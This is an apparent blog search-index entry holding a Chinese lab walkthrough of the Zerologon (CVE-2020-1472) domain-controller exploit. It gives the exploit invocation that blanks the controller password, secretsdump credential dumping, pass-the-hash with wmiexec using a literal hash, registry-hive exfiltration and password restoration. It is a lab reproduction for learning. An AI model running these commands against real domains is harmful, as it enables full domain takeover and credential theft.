<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>cve-2020-1472域内提权漏洞</title>
    <url>/2021/03/29/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>CVE-2020-1472是微软八月修复的一个严重的权限提升漏洞(并于昨天2020年9月15日secura发布了相关的漏洞细节，随后相关exp被构造发布)，通过Netlogon 远程协议 (MS-NRPC) 建立与域控制器连接安全通道时，存在特权提升的利用点，该漏洞的CVSS分高达10分，攻击者只需要在内网中有一个立足点，就可以远程获取域控的管理员权限。</p>
<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1</span><br><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</span><br><span class="line">Windows Server 2012</span><br><span class="line">Windows Server 2012 (Server Core installation)</span><br><span class="line">Windows Server 2012 R2</span><br><span class="line">Windows Server 2012 R2 (Server Core installation)</span><br><span class="line">Windows Server 2016</span><br><span class="line">Windows Server 2016 (Server Core installation)</span><br><span class="line">Windows Server 2019</span><br><span class="line">Windows Server 2019 (Server Core installation)</span><br><span class="line">Windows Server, version 1903 (Server Core installation)</span><br><span class="line">Windows Server, version 1909 (Server Core installation)</span><br><span class="line">Windows Server, version 2004 (Server Core installation)</span><br></pre></td></tr></table></figure>

<h1 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.通过漏洞脚本置空域控保存在AD中的密码</span><br><span class="line">2.通过secretsdump.py获取域控上的用户hash</span><br><span class="line">3.通过该hash使用wmiexec.py登录域控获取一个shell</span><br><span class="line">4.通过shell获取本地保存的原hash key</span><br><span class="line">5.通过获取的hash key恢复置空的域控密码</span><br></pre></td></tr></table></figure>

<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p> 利用脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;dirkjanm&#x2F;CVE-2020-1472	#域控保存在AD的密码置空，对域控有影响，要及时恢复</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;risksense&#x2F;zerologon		#恢复脚本</span><br></pre></td></tr></table></figure>

<p>除了上述脚本之外，还要用到python3下impacket模块中的secretsdump.py和wmiexec.py</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secretsdump.py	#置空域控hash后，获取其他用户hash</span><br><span class="line">wmiexec.py	#用获得的用户hash登录上去，获得一个shell</span><br></pre></td></tr></table></figure>

<p>这里对版本有要求，python3.7以上，impacket版本v0.9.22.dev1以上</p>
<p>我实验的时候用的kali做攻击机，impacket模块中两个脚本的路径是<kbd>/usr/share/doc/python3-impacket/examples</kbd>，要查看版本随便运行一个文件就可以看到</p>
<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127111729607.png" alt="image-20210127111729607"></p>
<p>新版impacket包下载地址<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
<p>下载后进入目录运行<kbd>sudo pip3 install .</kbd>即可安装新版impacket模块。如果没有pip3，按照以下方法安装pip3。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下载https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;get-pip.py</span><br><span class="line">python3 get-pip.py</span><br><span class="line">pip3 -V </span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127112246983.png" alt="image-20210127112246983"></p>
<p>都准备就绪后就可以开始实验了，环境如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击机kali	192.168.154.128</span><br><span class="line">边界机win7	192.168.154.130	192.168.52.143</span><br><span class="line">域控server08	192.168.52.138</span><br></pre></td></tr></table></figure>

<p>kali作为cs服务端，获取边界机的会话后设置代理24446端口</p>
<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127113026628.png" alt="image-20210127113026628"></p>
<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127113108084.png" alt="image-20210127113108084"></p>
<p>配置代理后，kali就可以访问域控了。OWA是域控主机名，可通过cs端口扫描到。也可在system权限下通过命令查找域控信息。</p>
<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127113652512.png" alt="image-20210127113652512"></p>
<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127114005936.png" alt="image-20210127114005936"></p>
<p>这里先用cve-2020-1472-exploit.py置空域控保存在AD中的密码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains python3 cve-2020-1472-exploit.py OWA 192.168.52.138</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127114042552.png" alt="image-20210127114042552"></p>
<p>查看域内用户hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains python3 secretsdump.py god.org&#x2F;OWA\$@192.168.52.138 -just-dc -no-pass</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127114555661.png" alt="image-20210127114555661"></p>
<p>通过wmiexec获取到Shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains python3 wmiexec.py god.org&#x2F;administrator@192.168.52.138 -hashes aad3b435b51404eeaad3b435b51404ee:3f589ddca9ecc4534635e8d432b5c541</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127114814615.png" alt="image-20210127114814615"></p>
<p>接下来就是恢复hash了，命令如下</p>
<p>先备份注册表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br><span class="line">get system.save</span><br><span class="line">get sam.save</span><br><span class="line">get security.save</span><br><span class="line">del &#x2F;f system.save</span><br><span class="line">del &#x2F;f sam.save</span><br><span class="line">del &#x2F;f security.save</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127115248808.png" alt="image-20210127115248808"></p>
<p>退出后可以看到多出三个文件</p>
<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127115405538.png" alt="image-20210127115405538"></p>
<p>使用secretsdump解析保存在本地的nt hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127115532747.png" alt="image-20210127115532747"></p>
<p>恢复原hash，这一步比较久</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains python3 reinstall_original_pw.py OWA 192.168.52.138 8e3ee83b233ce68699a27b6aa9c196dd</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127120102589.png" alt="image-20210127120102589"></p>
<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127120119842.png" alt="image-20210127120119842"></p>
<p>此时想再查看域内用户hash就会失败了</p>
<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127120322059.png" alt="image-20210127120322059"></p>
<p>但是因为之前拿到了administrator的hash，可以再用wmiexec获得shell。</p>
<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127120520658.png" alt="image-20210127120520658"></p>
<p>回顾一个整个过程，利用1472漏洞把域控保存在AD中的密码置空，置空后用secretsdump.py的-no-pass获取域控administrator的hash，再用wmiexec.py和admin的hash登录到域控获得一个shell，通过shell获取本地保存的原hash key，最后通过获取的hash key恢复置空的域控密码，过程中得到的admin的hash仍然可以用于登录域控。</p>
<p>争议：恢复原密码所用到的hash，看文章也有说是$MACHINE.ACC:plain_password_hex中的值</p>
<p>参考：</p>
<p><a href="https://www.cnblogs.com/goabout2/p/13676527.html">https://www.cnblogs.com/goabout2/p/13676527.html</a></p>
<p><a href="https://www.cnblogs.com/sup3rman/p/13680262.html">https://www.cnblogs.com/sup3rman/p/13680262.html</a></p>
<p><a href="https://www.cnblogs.com/Mikasa-Ackerman/p/CVE20201472.html">https://www.cnblogs.com/Mikasa-Ackerman/p/CVE20201472.html</a></p>
]]></content>
      <tags>
        <tag>cve-2020-1472</tag>
        <tag>提权</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
</search>
